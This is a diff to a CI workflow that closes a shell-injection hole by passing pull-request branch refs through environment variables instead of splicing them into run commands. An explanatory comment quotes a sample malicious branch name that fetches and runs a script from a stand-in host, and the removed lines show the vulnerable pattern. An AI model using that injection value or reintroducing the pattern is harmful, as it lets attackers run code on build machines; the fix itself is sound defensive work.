@@ -52,15 +52,26 @@ jobs:
           python -m pip install --upgrade --only-binary :all: pip
           pip install -e ".[dev]"
 
+      # A branch name is attacker-controlled on a fork PR. Interpolating `${{ }}`
+      # directly into `run:` splices it into the shell BEFORE the shell sees it,
+      # so a ref named `x"; curl evil.sh | sh; "` executes. Aikido flagged exactly
+      # this at critical severity on the first cut of this file -- in a workflow
+      # whose whole purpose is to be a security gate. Passing through `env:`
+      # keeps the value a shell VARIABLE, never shell SOURCE.
       - name: Ensure the PR base ref is available
-        run: git fetch origin "${{ github.event.pull_request.base.ref }}"
+        env:
+          BASE_REF: ${{ github.event.pull_request.base.ref }}
+        run: git fetch origin "$BASE_REF"
 
       - name: Run the breaking-change gate
         id: gate
+        env:
+          BASE_REF: ${{ github.event.pull_request.base.ref }}
+          HEAD_SHA: ${{ github.event.pull_request.head.sha }}
         run: |
           python scripts/breaking_schema_check.py --check \
-            --base-ref "origin/${{ github.event.pull_request.base.ref }}" \
-            --head-ref "${{ github.event.pull_request.head.sha }}"
+            --base-ref "origin/$BASE_REF" \
+            --head-ref "$HEAD_SHA"
 
       - name: Explain on a BREAKING finding
         if: failure() && steps.gate.outcome == 'failure'
